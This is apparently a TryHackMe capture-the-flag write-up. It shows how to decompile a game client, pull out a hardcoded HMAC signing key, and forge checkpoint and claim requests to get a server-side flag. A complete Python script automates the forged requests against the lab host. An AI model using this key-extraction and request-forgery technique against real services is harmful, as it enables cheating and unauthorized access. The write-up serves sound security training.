# [GLA II - On THM](https://tryhackme.com/room/grandlarcenyautoii)

Reading through the rooms debrief, we are told not to waste anytime with runtime exploitation of the game.

With that, once the game has been extracted, we proceed with reverse engineering the game using the gdre tool from github like last time ([GLA I writeup](https://github.com/stormk1n/writeups/blob/main/TryHackMe/Grand%20Larceny%20Auto%20I/method.md)).

This time around, our flag is stored server side, and we have to exploit the games "Checkpoint" logic in order to obtain our flag.

In the reversed scripts, we focus mainly on the files;
```
PoPClient.cs ### <-- But mainly ###
GameController.cs ### Tells us how ReportCheckpoint from PoPClient is called
```
In the PoPClient file, our interest lies in the lines 19, 129, 135, 144, 154 and 166 code blocks.
```c#
private static readonly byte[] SignKey = Encoding.UTF8.GetBytes("gla2_crew_sign_v1_2f9b6c8ad14e");

private static string Sign(string msg) ### <--- SIGNS OUR SIGNATURE (SIG) WITH THE SignKey ###
{
 byte[] array = HMACSHA256.HashData(SignKey, Encoding.UTF8.GetBytes(msg));
 StringBuilder stringBuilder = new StringBuilder(array.Length * 2);
 byte[] array2 = array;
 foreach (byte b in array2)
 {
   stringBuilder.Append(b.ToString("x2"));
 }
 return stringBuilder.ToString();
}

public string DeriveStaffRole() ### <--- BASED ON OUR STASH ORDER RETURNED, IT DERIVES A ROLE FOR US ###
{
 string s = "heat5_stash" + StashOrder[0] + "_stash" + StashOrder[1] + "_stash" + StashOrder[2] + "_vault";
 byte[] array = SHA1.HashData(Encoding.UTF8.GetBytes(s));
 StringBuilder stringBuilder = new StringBuilder(array.Length * 2);
 byte[] array2 = array;
 foreach (byte b in array2)
 {
   stringBuilder.Append(b.ToString("x2"));
 }
 return stringBuilder.ToString();
}


### Initiates a session for us plus our stash order (stash order changes from session to session) ###
public void StartSession()
{
 Status = "opening session...";
 Post("/session", "{}");
}

### Marks how far we've completed the game, like a savepoint of some sort ### 
public void ReportCheckpoint(string step)
{
 if (!(sessionId == "") && !Busy)
 {
  string text = Sign(sessionId + "|" + step + "|" + token);
  Post("/checkpoint", "{\"session_id\":\"" + sessionId + "\",\"step\":\"" + step + "\",\"token\":\"" + token + "\",\"sig\":\"" + text + "\"}");
 }
}

### Once we reach "step: vault", we can claim the flag from here ###
public void Claim()
{
 if (!(sessionId == "") && !Busy)
 {
  Status = "claiming...";
  string text = Sign(sessionId + "|claim|" + token);
  Post("/claim", "{\"session_id\":\"" + sessionId + "\",\"role\":\"player\",\"token\":\"" + token + "\",\"sig\":\"" + text + "\"}");
 }
}
```

# Getting the flag

First, we make a POST request to /session, which should returns a valid sessionId, token and stash_order like
```
{
 "session_id": "<SESSION ID>",
 "stash_order": [0, 2, 1], ### Varying stash_order ###
 "token": "<TOKEN>"
}
```

Once we have this, we can now create a checkpoint for ourselves, the algorithm used to issue signatures 'HMACSHA256' signed with 'gla2_crew_sign_v1_2f9b6c8ad14e' key.
```c#
### LINE 139
string text = Sign(sessionId + "|" + step + "|" + token); ### Initail step: heat5
```
Once done, we make a POST request to /checkpoint with
```
{
"session_id": "<SESSION ID>",
"step":"heat5",
"token": "<TOKEN>",
"sig":"<SIGNATURE>"
}
```
Which returns
```
{
"ok": true,
"step": "heat5",
"next": "stash0", ### Next stash order could be 2 or 1 (it varies)
"token": "<NEW TOKEN GENERATED>"
}
```

We sign a new signature with the new token obtain, submit and sign (repeat till we reach step "vault").

Once we at vault, we sign our claim signature with the final token obtained
```
string text = Sign(sessionId + "|claim|" + token);
```

with our session id and submit a POST request to /claim in order to get the flag
```
{
"session_id": "<SESSION ID>",
"role":"<ROLE OBTAINED FROM DERIVE ROLE FUNCTION, OBTAINED FROM SIGNING
        string s = "heat5_stash" + StashOrder[0] + "_stash" + StashOrder[1] + "_stash" + StashOrder[2] + "_vault";
        ",
"token": "<FINAL TOKEN>",
"sig":"<CLAIM SIGNATURE>"
}
```
Once submitted, the flag should be returned.


# Automate the process
Automate the whole process of sign-submit with a python script;
```
import hmac
import hashlib
import json
import time
import requests

# Target configuration
BASE_URL = "http://gla2.thm"
SIGN_KEY = b"gla2_crew_sign_v1_2f9b6c8ad14e"

def sign_message(msg):
    """Replicates the C# HMACSHA256 Sign method."""
    hashed = hmac.new(SIGN_KEY, msg.encode('utf-8'), hashlib.sha256)
    return hashed.hexdigest()

def derive_staff_role(stash_order):
    s = f"heat5_stash{stash_order[0]}_stash{stash_order[1]}_stash{stash_order[2]}_vault"
    hashed = hashlib.sha1(s.encode('utf-8'))
    return hashed.hexdigest()

def main():
    session = requests.Session()
    
    # Step 1: Start the session
    print("[*] Starting session...")
    try:
        response = session.post(f"{BASE_URL}/session", json={})
        res_data = response.json()
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
        
    session_id = res_data.get("session_id")
    stash_order = res_data.get("stash_order")
    token = res_data.get("token")
    
    print(f"[+] Session ID: {session_id}")
    print(f"[+] Stash Order: {stash_order}")
    print(f"[+] Initial Token: {token}")
    
    # Step 2: Traverse checkpoints dynamically
    current_step = "heat5"
    
    # We loop until current_step becomes "claim" (or something invalid)
    while current_step in ["heat5", "stash0", "stash1", "stash2", "vault"]:
        # Enforce wait delay as per server rate limit
        print(f"[*] Waiting 6 seconds to simulate gameplay for {current_step}...")
        time.sleep(6.1)
        
        print(f"[*] Submitting checkpoint for step: {current_step}")
        
        # Replicate: Sign(sessionId + "|" + step + "|" + token)
        msg = f"{session_id}|{current_step}|{token}"
        signature = sign_message(msg)
        
        payload = {
            "session_id": session_id,
            "step": current_step,
            "token": token,
            "sig": signature
        }
        
        response = session.post(f"{BASE_URL}/checkpoint", json=payload)
        checkpoint_res = response.json()
        
        if not checkpoint_res.get("ok"):
            print(f"[-] Error at checkpoint {current_step}: {checkpoint_res}")
            return
            
        # Update values for the next iteration
        current_step = checkpoint_res.get("next")
        token = checkpoint_res.get("token")
        print(f"[+] Checkpoint accepted. Next step: {current_step}")
        
    # Step 3: Deriving staff role and claiming the flag
    print("[*] 5 Checkpoints reached. Preparing final claim...")
    
    # Final delay safety buffer
    time.sleep(6.1)
    
    role = derive_staff_role(stash_order)
    claim_msg = f"{session_id}|claim|{token}"
    claim_signature = sign_message(claim_msg)
    
    claim_payload = {
        "session_id": session_id,
        "role": role,
        "token": token,
        "sig": claim_signature
    }
    
    print(f"[*] Submitting claim payload with derived role: {role}")
    final_response = session.post(f"{BASE_URL}/claim", json=claim_payload)
    
    print("\n[+] Response from server:")
    try:
        print(json.dumps(final_response.json(), indent=4))
    except Exception:
        print(final_response.text)

if __name__ == "__main__":
    main()
```
